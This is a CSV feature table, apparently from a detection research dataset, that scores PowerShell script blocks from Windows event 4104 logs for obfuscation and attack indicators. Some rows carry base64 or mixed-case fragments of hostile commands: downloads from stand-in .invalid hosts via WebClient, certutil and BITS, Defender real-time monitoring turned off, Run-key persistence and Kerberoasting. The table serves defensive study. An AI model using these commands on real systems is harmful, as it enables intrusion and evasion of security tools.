id,lexical_input_source,analysis_length,line_count,token_count,special_char_count,special_char_ratio,digit_ratio,whitespace_ratio,entropy,quoted_literal_count,short_literal_count,joined_literal_length,base64_candidate_count,longest_base64_candidate,decoded_view_count,backtick_count,concat_operator_count,join_operator_count,format_operator_count,char_cast_count,suspicious_mixed_case_count,suspicious_mixed_case_tokens,execution_hit_count,execution_hits,raw_execution_hit_count,recovered_execution_hit_count,decoded_execution_hit_count,download_hit_count,download_hits,raw_download_hit_count,recovered_download_hit_count,decoded_download_hit_count,network_c2_hit_count,network_c2_hits,raw_network_c2_hit_count,recovered_network_c2_hit_count,decoded_network_c2_hit_count,defense_evasion_hit_count,defense_evasion_hits,raw_defense_evasion_hit_count,recovered_defense_evasion_hit_count,decoded_defense_evasion_hit_count,persistence_hit_count,persistence_hits,raw_persistence_hit_count,recovered_persistence_hit_count,decoded_persistence_hit_count,credential_access_hit_count,credential_access_hits,raw_credential_access_hit_count,recovered_credential_access_hit_count,decoded_credential_access_hit_count,lolbin_hit_count,lolbin_hits,raw_lolbin_hit_count,recovered_lolbin_hit_count,decoded_lolbin_hit_count,collection_hit_count,collection_hits,raw_collection_hit_count,recovered_collection_hit_count,decoded_collection_hit_count,remote_execution_hit_count,remote_execution_hits,raw_remote_execution_hit_count,recovered_remote_execution_hit_count,decoded_remote_execution_hit_count,discovery_hit_count,discovery_hits,raw_discovery_hit_count,recovered_discovery_hit_count,decoded_discovery_hit_count,indicator_category_count,high_risk_category_count,raw_indicator_hit_count,indicator_hit_count,recovered_indicator_hit_count,decoded_indicator_hit_count
PST-056,windows_event_4104_scriptblocktext,78,1,8,6,0.076923,0.012821,0.102564,4.482464,0,0,0,0,0,0,0,0,0,0,0,1,Get-SmbShare,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-057,windows_event_4104_scriptblocktext,134,1,11,19,0.141791,0.0,0.074627,5.116614,1,0,94,0,0,0,0,0,0,0,0,5,ReSOlvE-dnsnAme;StrInGS;exPANDprOpeRtY;sELeCT-obJECT;task.eXAmplE.InvaLiD,0,,0,0,0,0,,0,0,0,1,resolve-dnsname,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-058,windows_event_4104_scriptblocktext,135,1,17,46,0.340741,0.0,0.044444,4.765755,8,8,40,0,0,0,0,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,0,1,0,1,0,0,1,1,0
PST-059,windows_event_4104_scriptblocktext,25,1,4,4,0.16,0.0,0.08,3.783465,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-060,windows_event_4104_scriptblocktext,55,1,7,6,0.109091,0.018182,0.127273,4.537316,0,0,0,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-061,windows_event_4104_scriptblocktext,570,1,10,27,0.047368,0.040351,0.005263,4.899109,1,0,448,1,448,1,0,0,0,0,0,2,FromBase64String;JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJAB3AGMALgBQAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACAAJAB3AGMALgBIAGUAYQBkAGUAcgBzAFsAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcAXQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACcAOwAgACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGEAJwApAA,0,,0,0,0,2,downloadstring;webclient,0,2,2,2,defaultwebproxy;user-agent,0,2,2,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,3,1,5,4,4
PST-062,windows_event_4104_scriptblocktext,170,1,20,54,0.317647,0.0,0.047059,4.744165,9,9,70,0,0,0,0,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,0,1,0,1,0,0,1,1,0
PST-063,windows_event_4104_scriptblocktext,116,1,14,27,0.232759,0.034483,0.017241,5.063902,1,0,78,0,0,0,2,0,0,0,0,1,CopyFromScreen,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,copyfromscreen,1,0,0,0,,0,0,0,0,,0,0,0,1,0,1,1,0,0
PST-064,windows_event_4104_scriptblocktext,283,1,30,101,0.35689,0.007067,0.024735,5.079155,13,12,167,0,0,0,0,0,1,0,0,1,ultWebProxy,0,,0,0,0,2,downloadstring;webclient,1,1,0,2,defaultwebproxy;user-agent,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,4,3,0
PST-065,windows_event_4104_scriptblocktext,133,1,13,15,0.112782,0.037594,0.067669,5.009729,1,1,8,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-066,windows_event_4104_scriptblocktext,279,1,33,103,0.369176,0.007168,0.032258,5.359985,13,8,173,0,0,0,6,0,1,0,0,2,NeT.weBCliENT;c.heAdErs,0,,0,0,0,2,downloadstring;webclient,1,1,0,2,defaultwebproxy;user-agent,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,4,3,0
PST-067,windows_event_4104_scriptblocktext,116,1,12,27,0.232759,0.008621,0.12931,4.647635,5,4,58,0,0,0,0,3,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-068,windows_event_4104_scriptblocktext,142,1,21,26,0.183099,0.056338,0.06338,4.889052,2,0,97,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-069,windows_event_4104_scriptblocktext,89,1,10,8,0.089888,0.011236,0.101124,4.678805,0,0,0,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-070,windows_event_4104_scriptblocktext,114,1,8,12,0.105263,0.0,0.061404,5.053145,1,0,50,0,0,0,0,0,0,0,0,1,Get-ItemProperty,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,1,0,0,1,0,1,1,0,0
PST-071,windows_event_4104_scriptblocktext,93,1,7,21,0.225806,0.107527,0.032258,5.29455,1,0,20,0,0,0,0,0,0,0,0,2,FromBase64String;aW52ZW50b3J5LW5vdGU,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-072,windows_event_4104_scriptblocktext,158,1,17,39,0.246835,0.0,0.158228,4.456602,10,10,75,0,0,0,0,9,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,invoke-kerberoast;outputformat hashcat;samaccountname,0,3,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,3,3,0
PST-073,windows_event_4104_scriptblocktext,56,1,5,5,0.089286,0.0,0.089286,4.113695,1,0,26,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-074,windows_event_4104_scriptblocktext,131,1,13,30,0.229008,0.0,0.022901,4.730117,1,0,91,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,mshta,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-075,windows_event_4104_scriptblocktext,126,1,9,22,0.174603,0.0,0.047619,4.994711,1,0,86,1,25,0,0,0,0,0,0,4,ExcLusiOnPatH;ThesiS_iNERT__;diSAbLErEALTImeMOnITOrinG;sEt-MpprEFerenCe,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,disableRealtimeMonitoring;exclusionpath;set-mppreference,3,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,3,3,0,0
PST-076,windows_event_4104_scriptblocktext,153,1,11,27,0.176471,0.0,0.052288,4.977561,1,0,111,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,collect.zip;compress-archive,2,0,0,0,,0,0,0,1,get-childitem,1,0,0,2,0,3,3,0,0
PST-077,windows_event_4104_scriptblocktext,57,1,6,5,0.087719,0.017544,0.105263,4.39797,0,0,0,0,0,0,0,0,0,0,0,2,Get-HotFix;HotFixID,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-078,windows_event_4104_scriptblocktext,244,1,30,92,0.377049,0.004098,0.045082,5.188666,14,13,137,0,0,0,2,0,1,0,0,3,AmPLe.I;NeW-ObjECT;VErxmLhTTP,1,iex,1,0,0,2,responseText;serverxmlhttp,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,3,2,0
PST-079,windows_event_4104_scriptblocktext,82,1,10,9,0.109756,0.02439,0.121951,4.411246,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-080,windows_event_4104_scriptblocktext,182,1,19,21,0.115385,0.021978,0.038462,5.075978,1,0,144,1,29,1,10,0,0,0,0,1,AdABlAC0ATwB1AH,2,encodedcommand;windowstyle hidden,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
PST-081,windows_event_4104_scriptblocktext,153,1,11,27,0.176471,0.0,0.052288,5.146674,1,0,111,0,0,0,0,0,0,0,0,5,ColLecT.ziP;ComPResS-arChIvE;DeSTInaTionpAtH;UseRpROfILe;gET-chiLditEm,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,collect.zip;compress-archive,2,0,0,0,,0,0,0,1,get-childitem,1,0,0,2,0,3,3,0,0
PST-082,windows_event_4104_scriptblocktext,65,1,6,6,0.092308,0.0,0.092308,4.404544,0,0,0,0,0,0,0,0,0,0,0,0,,1,get-command,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,2,1,2,2,0,0
PST-083,windows_event_4104_scriptblocktext,295,1,31,76,0.257627,0.013559,0.047458,5.35555,14,10,190,0,0,1,7,0,1,0,0,5,ABLAC0AtWb1AHQ;AcAB1aHqAiaAnAFqasab;SqBoAEuAuGBuaCCA;fAfMasqbtAc0A;hoST.exAmplE.INV,2,encodedcommand;scriptblock,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,computername;invoke-command,1,1,0,0,,0,0,0,2,2,1,4,3,0
PST-084,windows_event_4104_scriptblocktext,70,1,7,17,0.242857,0.0,0.142857,4.600801,2,2,14,0,0,0,0,3,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0
PST-085,windows_event_4104_scriptblocktext,143,1,10,14,0.097902,0.006993,0.062937,4.882098,1,0,51,0,0,0,0,0,0,0,0,1,Get-ItemProperty,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,currentversion\run,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,1,0,0,2,1,2,2,0,0
PST-086,windows_event_4104_scriptblocktext,54,1,6,6,0.111111,0.018519,0.092593,4.342282,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-087,windows_event_4104_scriptblocktext,172,1,9,11,0.063953,0.023256,0.040698,5.312058,1,0,134,1,72,1,0,0,0,0,0,5,HidDeN;NoProfIlE;eNCOdEDComMAnD;vWBYaGKAdABLAc0aTWb1aHqACaB1AhqaiAAnafQasAbfAFMAsqbtAC0asQBoaEuAUGbUacca;wiNDOwStylE,2,encodedcommand;windowstyle hidden,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
PST-088,windows_event_4104_scriptblocktext,237,1,29,88,0.371308,0.008439,0.037975,4.831956,12,12,122,0,0,0,0,0,1,0,0,0,,0,,0,0,0,1,invoke-restmethod,0,1,0,1,checkin,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,0
PST-089,windows_event_4104_scriptblocktext,86,1,6,7,0.081395,0.0,0.069767,4.653675,0,0,0,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-090,windows_event_4104_scriptblocktext,85,2,11,10,0.117647,0.023529,0.141176,4.69259,1,0,21,0,0,0,1,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-091,windows_event_4104_scriptblocktext,45,1,4,4,0.088889,0.0,0.088889,4.266047,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-092,windows_event_4104_scriptblocktext,123,1,16,20,0.162602,0.04065,0.073171,4.724287,2,0,78,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-093,windows_event_4104_scriptblocktext,97,1,11,10,0.103093,0.020619,0.113402,4.533608,1,1,16,0,0,0,0,0,0,0,0,1,Get-NetAdapter,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-094,windows_event_4104_scriptblocktext,450,1,10,27,0.06,0.037778,0.006667,4.924409,1,0,328,1,328,1,0,0,0,0,0,2,FromBase64String;SQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AYQBwAGkALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGMAaABlAGMAawBpAG4AJwAgAC0AQgBvAGQAeQAgAEAAewBoAG8AcwB0AD0AJwBXAFMALQAwADEAJwA7AHUAcwBlAHIAPQAnAGEAbgBhAGwAeQBzAHQAJwA7AHMAdABhAHQAdQBzAD0AJwBvAGsAJwB9AA,0,,0,0,0,1,invoke-restmethod,0,1,1,1,checkin,0,1,1,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,3,1,3,2,2
PST-095,windows_event_4104_scriptblocktext,157,1,17,34,0.216561,0.019108,0.089172,4.817907,2,0,75,0,0,0,0,0,0,0,0,1,ConvertFrom-Json,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-096,windows_event_4104_scriptblocktext,171,1,16,37,0.216374,0.011696,0.076023,5.194864,3,3,14,0,0,0,0,0,0,0,0,2,ForEach-Object;Get-FileHash,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-097,windows_event_4104_scriptblocktext,89,1,9,9,0.101124,0.011236,0.101124,4.264418,2,1,42,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-098,windows_event_4104_scriptblocktext,139,1,16,34,0.244604,0.007194,0.151079,4.656351,7,6,45,0,0,0,0,6,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0
PST-099,windows_event_4104_scriptblocktext,121,1,14,14,0.115702,0.024793,0.132231,4.429826,2,0,67,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-100,windows_event_4104_scriptblocktext,152,1,19,48,0.315789,0.013158,0.164474,4.42482,10,10,69,0,0,0,0,9,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,regsvr32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-101,windows_event_4104_scriptblocktext,602,1,10,25,0.041528,0.039867,0.004983,4.844091,1,0,480,1,480,1,0,0,0,0,0,2,FromBase64String;YwBlAHIAdAB1AHQAaQBsAC4AZQB4AGUAIAAtAHUAcgBsAGMAYQBjAGgAZQAgAC0AcwBwAGwAaQB0ACAALQBmACAAaAB0AHQAcABzADoALwAvAGMAZQByAHQALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGIAbABvAGIALgB0AHgAdAAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAOwAgAGMAZQByAHQAdQB0AGkAbAAuAGUAeABlACAALQBkAGUAYwBvAGQAZQAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAIABDADoAXABfAF8AVABIAEUAUwBJAFMAXwBJAE4ARQBSAFQAXwBfAFwAcwB0AGEAZwBlAC4AYgBpAG4A,0,,0,0,0,1,certutil,0,1,1,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,1,certutil,0,1,1,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,3,1,3,2,2
PST-102,windows_event_4104_scriptblocktext,113,1,12,12,0.106195,0.017699,0.115044,4.734314,1,1,16,0,0,0,0,0,0,0,0,1,ConvertTo-Csv,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-103,windows_event_4104_scriptblocktext,610,1,10,25,0.040984,0.027869,0.004918,4.703686,1,0,488,1,488,1,0,0,0,0,0,1,FromBase64String,2,encodedcommand;scriptblock,0,2,2,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,computername;invoke-command,0,2,2,0,,0,0,0,3,3,1,5,4,4
PST-104,windows_event_4104_scriptblocktext,91,1,7,18,0.197802,0.021978,0.032967,4.990068,1,0,53,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,rundll32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-105,windows_event_4104_scriptblocktext,129,1,18,29,0.224806,0.062016,0.085271,5.08623,2,0,67,0,0,0,0,0,0,0,0,1,ForEach-Object,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-106,windows_event_4104_scriptblocktext,82,1,13,20,0.243902,0.04878,0.04878,4.652083,1,0,58,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-107,windows_event_4104_scriptblocktext,44,1,4,4,0.090909,0.0,0.090909,4.450196,0,0,0,0,0,0,0,0,0,0,0,1,Get-TimeZone,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-108,windows_event_4104_scriptblocktext,102,1,9,9,0.088235,0.029412,0.088235,4.642152,1,1,16,0,0,0,0,0,0,0,0,1,Get-CimInstance,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,win32_bios,1,0,0,1,0,1,1,0,0
PST-109,windows_event_4104_scriptblocktext,119,1,10,11,0.092437,0.008403,0.084034,4.762618,1,1,16,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-110,windows_event_4104_scriptblocktext,146,1,11,29,0.19863,0.0,0.041096,5.121624,1,0,104,0,0,0,0,0,0,0,0,4,BiTS.ExaMpLE.InvaLiD;DeSTiNAtiON;STaRT-bITStrANSFER;pAylOAD.BiN,0,,0,0,0,1,start-bitstransfer,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-111,windows_event_4104_scriptblocktext,107,1,12,21,0.196262,0.018692,0.065421,5.101673,1,0,69,0,0,0,0,0,0,0,0,1,ReG.ExAmpLe.inVAliD,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,regsvr32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-112,windows_event_4104_scriptblocktext,220,1,16,41,0.186364,0.004545,0.054545,5.28904,1,0,176,0,0,0,0,0,0,0,0,7,MIcrOsofT;ThEsIS_IneRT__;curRENTVersIoN;nEW-iTeMpROPerTy;powErsHelL.eXe;upDAteChecK;wINdOWsTYLe,1,windowstyle hidden,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,currentversion\run;new-itemproperty,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-113,windows_event_4104_scriptblocktext,114,1,12,25,0.219298,0.035088,0.017544,5.02488,1,0,76,0,0,0,0,0,0,0,0,1,CopyFromScreen,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,copyfromscreen,1,0,0,0,,0,0,0,0,,0,0,0,1,0,1,1,0,0
PST-114,windows_event_4104_scriptblocktext,139,1,18,51,0.366906,0.0,0.064748,4.86447,10,9,48,0,0,0,3,0,1,0,0,1,rTTo-Js,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-clipboard,0,1,0,0,,0,0,0,0,,0,0,0,1,0,0,1,1,0
